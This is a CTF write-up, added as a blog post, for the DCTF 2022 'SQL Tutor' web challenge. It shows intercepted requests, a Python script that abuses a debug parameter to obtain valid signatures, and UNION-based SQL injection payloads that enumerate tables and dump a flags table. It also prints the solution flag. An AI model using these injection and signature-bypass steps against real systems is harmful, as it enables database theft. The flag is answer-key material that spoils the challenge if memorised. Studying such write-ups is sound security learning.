@@ -1,0 +1,205 @@
+---
+title: "SQL Tutor challenge writeup"
+author: "0xMesbaha"
+cover: "/media/CTFs/Flag.png"
+tags: ["CTF", "SQL injection" , "python"]
+date: 2022-04-17T12:49:18+34:08
+draft: false
+---
+
+DCTF 2022 was held from the 15th of April Until the 17th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was ranked easy.
+<!--more-->
+
+|||
+| ----------- | ----------- |
+| CTF name      | [DCTF 2022](https://dctf.dragonsec.si/) |
+| challenge    | SQL Tutor |
+| category   | web        |
+|about| SQL injection|
+|description| I found this awesome site for learning SQL. Check it out!|
+|	points   | 200 |
+|  team | [0xCha0s](https://ctftime.org/team/168238) |
+|solved By|[0xMesbaha](https://hussienmisbah.github.io/) and [itsFading](https://itsfading.github.io/) |
+
+
+## Discovery
+
+
+we are introduced with this page which execute fixed SQL statements and take one input to fill the ``...`` in the query
+
+
+![image](/media/CTFs/SQL_Tutor/20220416155837.png)
+
+However it wasn't that easy , there are some filters for special characters like ``[ ' " `] `` and for some words like  ``UNION``
+
+![image](/media/CTFs/SQL_Tutor/20220416155856.png)
+
+## Enumeration
+
+Intercepting the request with Burpsuite to see what is going on , we can see the following :
+
+```bash
+POST /verify_and_sign_text HTTP/1.1
+Host: sqltutor.dragonsec.si
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 22
+Origin: https://sqltutor.dragonsec.si
+Te: trailers
+Connection: close
+
+text=dGVzdG1l&alg=sha1
+```
+
+the text we sent has base64 encoded , and other argument is sent ``alg`` , sending this request to the repeater and view the response body we can see:
+
+```json
+{"status":"ok","trimmedText":"dGVzdG1l","signature":"f26039ef86a8c1218019b40e636d66ecfb45324a","debug":null}
+```
+
+it return status ok , if we have changed the text being sent to a text contain one of the Blacklisted characters we will got another response body :
+
+```json
+{"status":"error","message":"Dangerous strings:[ ' ] in text!","debug":null}
+```
+
+Great , Forwarding the request , we can see another request is issued :
+
+```bash
+POST /execute HTTP/2
+Host: sqltutor.dragonsec.si
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 74
+Origin: https://sqltutor.dragonsec.si
+Te: trailers
+
+text=dGVzdG1l&signature=f26039ef86a8c1218019b40e636d66ecfb45324a&queryNo=0
+```
+
+and this request will be issued only if the first request passed returns ``status:ok`` , sending the latest request to the repeater to view the response we can see response body as :
+
+```json
+{"status":"ok","query":"SELECT * FROM users WHERE users.name='testme'","results":[],"description":"This query selects all users with the name 'testme'.","debug":null}
+```
+
+
+and we can see ``"debug:null"`` , we can try to add it as a parameter in the ``/execute`` request and will have the following results  
+
+![image](/media/CTFs/SQL_Tutor/20220416161431.png)
+
+we know now the steps it passed through before the execution , so we know that :
+
+```
+2 requests are issued :
+1st one make sure the text doesn't contain a blacklisted element "the check is at the client side"
+2nd one will decode the text form base64 , verify the signature and then execute the query
+```
+
+we can skip the first request easily and focus on the 2nd request , providing the ``debug`` parameter to know the tests we failed or passed
+
+if we try to change the base64 encoded text in the request the old signature will not work
+
+![image](/media/CTFs/SQL_Tutor/20220416162046.png)
+
+and thanks to the ``debug`` parameter we know what value should this signature be , so basically we need to issue the request 2 times one to get the valid signature and the other to send the payload associated with the valid signature
+
+## Exploitation
+we can automate the process to save the time and for efficiency , Let's Build the script :
+- sending the request for the 1st time to extract the signature value :
+
+```python
+#!/usr/bin/python3
+import requests
+import base64
+
+
+url= "https://sqltutor.dragonsec.si/execute"
+payload ="""testme """.encode('utf-8')
+encoded=base64.b64encode(payload).decode('utf-8')
+data = {
+"text":encoded,
+"signature":"dummy",
+"queryNo":"0",
+"debug":"true"
+}
+
+r1= requests.post(url,data=data)
+print(r1.text)
+```
+
+![image](/media/CTFs/SQL_Tutor/20220416162632.png)
+
+we will extract the signature value then update the signature parameter in the next request
+
+```python
+resp=r1.text
+signature= resp.split('"compare":"')[1][0:40]
+
+data["signature"]=signature
+r2= requests.post(url,data=data)
+print(r2.text)
+````
+
+![image](/media/CTFs/SQL_Tutor/20220416162839.png)
+
+Great the signature is okay and the query is executed , now we are ready to inject our text in the statement to be executed
+
+From the debug output the query is :
+
+```SQL
+SELECT * FROM users WHERE users.name='test'
+```
+
+we need to know number of columns first , update the payload variable :
+
+```python
+payload ="""a' order by 8-- """.encode('utf-8')
+```
+
+![image](/media/CTFs/SQL_Tutor/20220416163416.png)
+
+keep fuzzing downwards until
+```python
+payload ="""a' order by 4-- """.encode('utf-8')
+```
+
+![image](/media/CTFs/SQL_Tutor/20220416163440.png)
+
+we know it has 4 columns , now let's enumerate the tables names :
+
+```python
+payload ="""a' UNION SELECT 1,2,3,table_name FROM information_schema.tables--""".encode('utf-8')
+```
+
+and we got this huge output :
+
+![image](/media/CTFs/SQL_Tutor/20220416163702.png)
+
+Beautifying the output , we can notice the ``flags`` table :
+
+![image](/media/CTFs/SQL_Tutor/20220416163812.png)
+
+- Let's update our payload :
+
+```python
+payload ="""a' UNION SELECT 1,2,3,flag FROM flags-- """.encode('utf-8')
+```
+
+![image](/media/CTFs/SQL_Tutor/20220416163929.png)
+
+and finally the flag is here
+
+```bash
+dctf{Pump_7h3_s7r3am_h4s5_up!_353aa965}
+```
+
+![](https://media.giphy.com/media/CyoQdbc7FHqqTpkSPI/giphy.gif)
